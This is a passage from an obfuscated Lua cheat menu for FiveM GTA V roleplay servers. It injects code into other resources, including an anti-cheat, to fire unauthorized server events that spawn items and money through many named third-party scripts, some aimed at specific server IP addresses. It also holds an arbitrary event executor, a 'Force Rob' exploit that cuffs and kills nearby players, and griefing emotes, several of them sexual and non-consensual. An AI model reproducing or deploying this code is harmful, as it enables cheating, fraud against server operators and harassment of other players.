        ]]);end);MachoMenuButton(v44[1848 -(559 + 1288) ],"Blame Arrest",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function WXY7LpqKto()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkCuff then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkCuff = false
                    else
                        StarkCuff = true
                        if not HasAnimDictLoaded("mp_arresting") then
                            RequestAnimDict("mp_arresting")
                            while not HasAnimDictLoaded("mp_arresting") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                    end
                end
            end

            WXY7LpqKto()
        ]]);end);MachoMenuButton(v44[1932 -(609 + 1322) ],"Blame Carry",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function KmXYpTzqLW()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkCarry then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkCarry = false
                    else
                        StarkCarry = true
                        if not HasAnimDictLoaded("nm") then
                            RequestAnimDict("nm")
                            while not HasAnimDictLoaded("nm") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            KmXYpTzqLW()
        ]]);end);MachoMenuButton(v44[1],"Sit On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function PxKvqLtNYz()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                    RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                    while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                        Wait(0)
                    end
                end

                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
            end

            PxKvqLtNYz()
        ]]);end);MachoMenuButton(v44[455 -(13 + 441) ],"Ride Driver",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function vZqPWLXm97()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if RideDriver then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        RideDriver = false
                    else
                        RideDriver = true
                        if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                            RequestAnimDict("mini@prostitutes@sexnorm_veh")
                            while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            vZqPWLXm97()
        ]]);end);MachoMenuButton(v44[3 -2 ],"Blow Driver",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qPLWtXYzKm()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if BlowDriver then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        BlowDriver = false
                    else
                        BlowDriver = true
                        if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                            RequestAnimDict("mini@prostitutes@sexnorm_veh")
                            while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                Wait(0)
                            end
                        end

                        TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            qPLWtXYzKm()
        ]]);end);MachoMenuButton(v44[1],"Meditate On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function XYqLvTzWKo()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                    RequestAnimDict("rcmcollect_paperleadinout@")
                    while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                        Wait(0)
                    end
                end

                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
            end

            XYqLvTzWKo()
        ]]);end);local v58=0;local v59=false;local v60=nil;local v61={[0 -0 ]="slapped",[1]="punched",[9 -7 ]="receiveblowjob",[1 + 2 ]="GiveBlowjob",[4]="headbutted",[18 -13 ]="hug4",[6]="streetsexfemale",[3 + 4 ]="streetsexmale",[4 + 4 ]="pback2",[9]="carry3",[10]=".....gta298",[32 -21 ]=".....gta304",[7 + 5 ]=".....gta284"};MachoMenuDropDown(v44[2],"Emote Choice",function(v211) v58=v211;end,"Slapped","Punched","Give BJ","Recieve BJ","Headbutt","Hug","StreetSexFemale","StreetSexMale","Piggyback","Carry","Butt Rape","Amazing Head","Lesbian Scissors");MachoMenuButton(v44[3 -1 ],"Give Emote",function() local v212=v61[v58];if v212 then MachoInjectResource2(3,(v48("monitor") and "monitor") or "any" ,string.format([[
                local function KmTpqXYzLv()
                    local Rk3uVnTZpxf7Q = TriggerEvent
                    Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
                end

                KmTpqXYzLv()
            ]],v212));end end);InputBoxHandle=MachoMenuInputbox(v45[1],"Name:","...");InputBoxHandle2=MachoMenuInputbox(v45[1 + 0 ],"Amount:","...");MachoMenuButton(v45[1 + 0 ],"Spawn",function() local v213=0 + 0 ;local v214;local v215;while true do if (v213==(0 + 0)) then v214=MachoMenuGetInputbox(InputBoxHandle);v215=MachoMenuGetInputbox(InputBoxHandle2);v213=1 + 0 ;end if (v213==1) then if (v214 and (v214~="") and v215 and tonumber(v215)) then local v327=tonumber(v215);local v328={ak47_drugmanager=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function efjwr8sfr()
                            TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v214   .. [[", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        efjwr8sfr()
                    ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(436 -(153 + 280) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safdagwawe()
                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        safdagwawe()
                    ]] );end,["mc9-taco"]=function() MachoInjectResource2(8 -5 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function cesfw33w245d()
                            TriggerServerEvent('mc9-taco:server:addItem', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        cesfw33w245d()
                    ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safdagwawe()
                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        safdagwawe()
                    ]] );end,["wp-pocketbikes"]=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function awdfaweawewaeawe()
                            TriggerServerEvent("wp-pocketbikes:server:AddItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        awdfaweawewaeawe()
                    ]] );end,["solos-jointroll"]=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function weawasfawfasfa()
                            TriggerServerEvent('solos-joints:server:itemadd', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        weawasfawfasfa()
                    ]] );end,["angelicxs-CivilianJobs"]=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safafawfaws()
                            TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        safafawfaws()
                    ]] );end,ars_whitewidow_v2=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                                items = {
                                    {
                                        id = "]]   .. v214   .. [[",
                                        image = "JTG",
                                        name = "JTG",
                                        page = 1,
                                        price = 500,
                                        quantity = ]]   .. v215   .. [[,
                                        stock = 999999999999999999999999999,
                                        totalPrice = 0
                                    }
                                },
                                method = "cash",
                                total = 0
                            }, "cash")
                        end

                        sDfjMawT34()
                    ]] );end,ars_cannabisstore_v2=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                            items = {
                                {
                                    id = "]]   .. v214   .. [[",
                                    image = "JTG",
                                    name = "JTG",
                                    page = JTG,
                                    price = 0,
                                    quantity = ]]   .. v215   .. [[,
                                    stock = 10000000000000,
                                    totalPrice = 0
                                }
                            },
                            method = "JTG",
                            total = 0
                        }, "cash")
                    end

                    sDfjMawT34()
                    ]] );end,ars_hunting=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("ars_hunting:sellBuyItem",  {
                                item = "]]   .. v214   .. [[",
                                price = 1,
                                quantity = ]]   .. v215   .. [[,
                                buy = true
                            })
                        end

                        sDfjMawT34()
                    ]] );end,["boii-whitewidow"]=function() local v341={"217.20.242.24:30120"};local function v342(v380) local v381=0;while true do if ((0 + 0)==v381) then for v420,v421 in ipairs(v341) do if (v380==v421) then return true;end end return false;end end end local v343=GetCurrentServerEndpoint();if v342(v343) then MachoInjectResource2(670 -(89 + 578) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent('boii-whitewidow:server:AddItem', ']]   .. v214   .. [[', ]]   .. v215   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end end,["codewave-cannabis-cafe"]=function() local v344={"185.244.106.45:30120"};local function v345(v382) local v383=0 + 0 ;while true do if (v383==(0 -0)) then for v422,v423 in ipairs(v344) do if (v382==v423) then return true;end end return false;end end end local v346=GetCurrentServerEndpoint();if v345(v346) then MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]]   .. v214   .. [[", newItem = "JTG", pricePerItem = 0 }, ]]   .. v215   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end end,["snipe-boombox"]=function() MachoInjectResource2(1052 -(572 + 477) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("snipe-boombox:server:pickup", ]]   .. v215   .. [[, vector3(0.0, 0.0, 0.0), "]]   .. v214   .. [[")
                        end

                        sDfjMawT34()
                    ]] );end,devkit_bbq=function() MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('devkit_bbq:addinv', ']]   .. v214   .. [[', ]]   .. v215   .. [[)
                        end

                        sDfjMawT34()
                    ]] );end,mt_printers=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[  
                        local function sDfjMawT34()
                            TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:JTG", "]]   .. v214   .. [[", "add")
                        end

                        sDfjMawT34()
                    ]] );end,WayTooCerti_3D_Printer=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[ 
                        local function ZxUwQsErTy12()
                            TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']]   .. v214   .. [[', ]]   .. v215   .. [[)
                        end
                        ZxUwQsErTy12()
                    ]] );end,["pug-fishing"]=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function MnBvCxZlKjHgFd23()
                            TriggerServerEvent('Pug:server:GiveFish', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        MnBvCxZlKjHgFd23()
                    ]] );end,apex_koi=function() MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function ErTyUiOpAsDfGh45()
                            TriggerServerEvent("apex_koi:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        ErTyUiOpAsDfGh45()
                    ]] );end,apex_peckerwood=function() MachoInjectResource2(89 -(84 + 2) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function UiOpAsDfGhJkLz67()
                            TriggerServerEvent("apex_peckerwood:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        UiOpAsDfGhJkLz67()
                    ]] );end,apex_thetown=function() MachoInjectResource2(4 -1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function PlMnBvCxZaSdFg89()
                            TriggerServerEvent("apex_thetown:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        PlMnBvCxZaSdFg89()
                    ]] );end,["codewave-bbq"]=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function QwErTyUiOpAsDf90()
                            for i = 1, ]]   .. v215   .. [[ do
                                TriggerServerEvent('placeProp:returnItem', "]]   .. v214   .. [[")
                                Wait(1)
                            end
                        end
                        QwErTyUiOpAsDf90()
                    ]] );end,brutal_hunting=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function TyUiOpAsDfGhJk01()
                            Wait(1)
                            TriggerServerEvent("brutal_hunting:server:AddItem", {
                                {
                                    amount = "]]   .. v215   .. [[",
                                    item = "]]   .. v214   .. [[",
                                    label = "J",
                                    price = 0
                                }
                            })
                        end
                        TyUiOpAsDfGhJk01()
                    ]] );end,xmmx_bahamas=function() MachoInjectResource2(845 -(497 + 345) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function JkLzXcVbNmQwEr02()
                            TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]]   .. v214   .. [[", {
                                amount = ]]   .. v215   .. [[,
                                cash = {
                                }
                            })
                        end
                        JkLzXcVbNmQwEr02()
                    ]] );end,ak47_drugmanager=function() local v347={"162.222.16.18:30120"};local function v348(v384) for v399,v400 in ipairs(v347) do if (v384==v400) then return true;end end return false;end local v349=GetCurrentServerEndpoint();if v348(v349) then MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function aKf48SlWd()
                                Wait(1)
                                TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v214   .. [[", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                            end
                            aKf48SlWd()
                        ]] );end end,xmmx_letscookplus=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function QwErTy123()
                            Wait(1)
                            TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                                totalCost = 0,
                                cart = {
                                    {name = "]]   .. v214   .. [[", quantity = ]]   .. v215   .. [[}
                                }
                            }, "bank")
                        end
                        QwErTy123()
                    ]] );end,["xmmx-letscamp"]=function() local v350=0 + 0 ;local v351;local v352;local v353;while true do if (v350==(1334 -(605 + 728))) then function v352(v411) local v412=0;while true do if (v412==(0 + 0)) then for v427,v428 in ipairs(v351) do if (v411==v428) then return true;end end return false;end end end v353=GetCurrentServerEndpoint();v350=3 -1 ;end if (v350==(1 + 1)) then if  not v352(v353) then local v424=0 -0 ;local v425;while true do if (v424==0) then v425=string.format([[ 
                            local function XcVbNm82()
                                Wait(1)
                                TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']]   .. v214   .. [[', {
                                    ["%s"] = {
                                        ['lccampherbs'] = 0,
                                        ['lccampmeat'] = 0,
                                        ['lccampbutta'] = 0
                                    },
                                    ['amount'] = ]]   .. v215   .. [[
                                })
                            end
                            XcVbNm82()
                        ]] ,v214);MachoInjectResource2(3,"xmmx-letscamp",v425);break;end end end break;end if (v350==(0 + 0)) then v351={"66.70.153.70:80"};v352=nil;v350=1;end end end,wasabi_mining=function() MachoInjectResource2(7 -4 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function MzXnJqKs88()
                            local item = {
                                difficulty = { "medium", "medium" },
                                item = "]]   .. v214   .. [[",
                                label = "JTG",
                                price = { 110, 140 }
                            }

                            local index = 3
                            local amount = ]]   .. v215   .. [[

                            for i = 1, amount do
                                Wait(1)
                                TriggerServerEvent('wasabi_mining:mineRock', item, index)
                            end
                        end
                        MzXnJqKs88()
                    ]] );end,apex_bahama=function() local v354=0;local v355;local v356;local v357;while true do if (v354==(1 + 0)) then function v356(v413) local v414=489 -(457 + 32) ;while true do if (v414==(0 + 0)) then for v429,v430 in ipairs(v355) do if (v413==v430) then return true;end end return false;end end end v357=GetCurrentServerEndpoint();v354=1404 -(832 + 570) ;end if (v354==(2 + 0)) then if v356(v357) then MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function PlMnBv55()
                                Wait(1)
                                TriggerServerEvent("apex_bahama:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                            end
                            PlMnBv55()
                        ]] );end break;end if (v354==(0 -0)) then v355={"89.31.216.161:30120"};v356=nil;v354=797 -(588 + 208) ;end end end,["jg-mechanic"]=function() local v358=0 -0 ;local v359;local v360;local v361;while true do if (v358==0) then v359={"91.190.154.43:30120"};v360=nil;v358=1801 -(884 + 916) ;end if (v358==(1 -0)) then function v360(v415) local v416=0 + 0 ;while true do if (v416==0) then for v431,v432 in ipairs(v359) do if (v415==v432) then return true;end end return false;end end end v361=GetCurrentServerEndpoint();v358=655 -(232 + 421) ;end if ((1891 -(1569 + 320))==v358) then if v360(v361) then MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function HjKlYu89()
                                Wait(1)
                                TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v214   .. [[", 0, ]]   .. v215   .. [[, "autoexotic", 1)
                            end
                            HjKlYu89()
                        ]] );end break;end end end,["jg-mechanic"]=function() local v362=0 + 0 ;local v363;local v364;local v365;while true do if (v362==(3 -2)) then function v364(v417) local v418=605 -(316 + 289) ;while true do if (v418==(0 -0)) then for v433,v434 in ipairs(v363) do if (v417==v434) then return true;end end return false;end end end v365=GetCurrentServerEndpoint();v362=1 + 1 ;end if (v362==(1455 -(666 + 787))) then if v364(v365) then MachoInjectResource2(428 -(360 + 65) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function LkJfQwOp78()
                                Wait(1)
                                TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v214   .. [[", 0, ]]   .. v215   .. [[, "TheCultMechShop", 1)
                            end
                            LkJfQwOp78()
                        ]] );end break;end if (0==v362) then v363={"191.96.152.17:30121"};v364=nil;v362=1;end end end};local v329=false;for v366,v367 in pairs(v328) do if (GetResourceState(v366)=="started") then v367();v329=true;break;end end if  not v329 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end else MachoMenuNotification("[NOTIFICATION] JTG Menu","Invalid Item or Amount.");end break;end end end);MoneyInputBox=MachoMenuInputbox(v45[256 -(79 + 175) ],"Amount:","...");MachoMenuButton(v45[2 -0 ],"Spawn Money",function() local v216=MachoMenuGetInputbox(MoneyInputBox);if (v216 and tonumber(v216)) then local v292=0;local v293;local v294;local v295;while true do if (v292==(1 + 0)) then v295=false;for v368,v369 in pairs(v294) do if (GetResourceState(v368)=="started") then v369();v295=true;break;end end v292=5 -3 ;end if (v292==(3 -1)) then if  not v295 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end break;end if ((899 -(503 + 396))==v292) then v293=tonumber(v216);v294={["codewave-lashes-phone"]=function() MachoInjectResource2(184 -(92 + 89) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardlashes', ]]   .. v293   .. [[)
                ]] );end,["codewave-nails-phone"]=function() MachoInjectResource2(5 -2 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardnails', ]]   .. v293   .. [[)
                ]] );end,["codewave-caps-client-phone"]=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardCaps', ]]   .. v293   .. [[)
                ]] );end,["codewave-wigs-v3-phone"]=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardWigss', ]]   .. v293   .. [[)
                ]] );end,["codewave-icebox-phone"]=function() MachoInjectResource2(11 -8 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardiceboxs', ]]   .. v293   .. [[)
                ]] );end,["codewave-sneaker-phone"]=function() MachoInjectResource2(1 + 2 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardShoes', ]]   .. v293   .. [[)
                ]] );end,["codewave-handbag-phone"]=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardhandbags', ]]   .. v293   .. [[)
                ]] );end};v292=1;end end else MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");end end);local v62=MachoMenuInputbox(v45[8 -4 ],"Event:","...");local v63=MachoMenuInputbox(v45[4],"Type:","...");local v64=MachoMenuInputbox(v45[4 + 0 ],"Resource:","...");local v65={"monitor","any"};MachoMenuButton(v45[1 + 3 ],"Execute",function() local v217=MachoMenuGetInputbox(v62);local v218=MachoMenuGetInputbox(v63);local v219=MachoMenuGetInputbox(v64);if ( not v217 or (v217=="")) then return;end local v220,v221=load("return function() return "   .. v217   .. " end" );if  not v220 then return;end local v222,v223=pcall(v220);if ( not v222 or (type(v223)~="function")) then return;end local v224={pcall(v223)};if  not v224[1] then return;end local v225=v224[1246 -(485 + 759) ];local v226={};for v270=6 -3 , #v224 do table.insert(v226,v224[v270]);end local function v227(v271) if (type(v271)=="string") then return string.format("%q",v271);elseif ((type(v271)=="number") or (type(v271)=="boolean")) then return tostring(v271);elseif (type(v271)=="table") then local v385,v386=pcall(function() return json.encode(v271);end);return (v385 and string.format("json.decode(%q)",v386)) or "nil" ;else return "nil";end end local v228={};for v272,v273 in ipairs(v226) do table.insert(v228,v227(v273));end local v229=(( #v228>(1189 -(442 + 747))) and table.concat(v228,", ")) or "" ;local v230=string.format([[
            local event = %q
            local triggerType = string.lower(%q)
            local args = { %s }

            if triggerType == "server" then
                TriggerServerEvent(event, table.unpack(args))
            else
                TriggerEvent(event, table.unpack(args))
            end
        ]],tostring(v225),string.lower(v218 or "client" ),v229);local v231=nil;if (v219 and (v219~="")) then if (GetResourceState(v219)=="started") then v231=v219;end else for v299,v300 in ipairs(v65) do if (GetResourceState(v300)=="started") then v231=v300;break;end end end if v231 then MachoInjectResource(v231,v230);end end);local v66=1135 -(832 + 303) ;local v67={[946 -(88 + 858) ]={name="[E] Force Rob",resource=nil,code=nil}};MachoMenuDropDown(v45[1 + 2 ],"Exploit Choice",function(v232) v66=v232;end,v67[0 + 0 ].name);MachoMenuButton(v45[1 + 2 ],"Execute",function() local v233=789 -(766 + 23) ;local v234;while true do if (v233==(4 -3)) then if (v66==(0 -0)) then local v330=0 -0 ;local v331;local v332;local v333;while true do if ((6 -4)==v330) then for v406,v407 in ipairs(v332 or {} ) do if (GetResourceState(v407)=="started") then MachoInjectResource2(1076 -(1036 + 37) ,v407,([[
                        local function awt72q48dsgn()
                            local awgfh347gedhs = CreateThread
                            awgfh347gedhs(function()
                                local dict = 'missminuteman_1ig_2'
                                local anim = 'handsup_enter'

                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do
                                    Wait(0)
                                end

                                while true do
                                    Wait(0)
                                    if IsDisabledControlJustPressed(0, 38) then
                                        local selfPed = PlayerPedId()
                                        local selfCoords = GetEntityCoords(selfPed)
                                        local closestPlayer = -1
                                        local closestDistance = -1

                                        for _, player in ipairs(GetActivePlayers()) do
                                            local targetPed = GetPlayerPed(player)
                                            if targetPed ~= selfPed then
                                                local coords = GetEntityCoords(targetPed)
                                                local dist = #(selfCoords - coords)
                                                if closestDistance == -1 or dist < closestDistance then
                                                    closestDistance = dist
                                                    closestPlayer = player
                                                end
                                            end
                                        end

                                        if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                            local ped = GetPlayerPed(closestPlayer)

                                            local CEPressPlayer = SetEnableHandcuffs
                                            local CEDeadPlayerCheck = SetEntityHealth

                                            if not IsPedCuffed(ped) then
                                                CEPressPlayer(ped, true)
                                                CEDeadPlayerCheck(ped, 0)
                                                CEPressPlayer(ped, true)
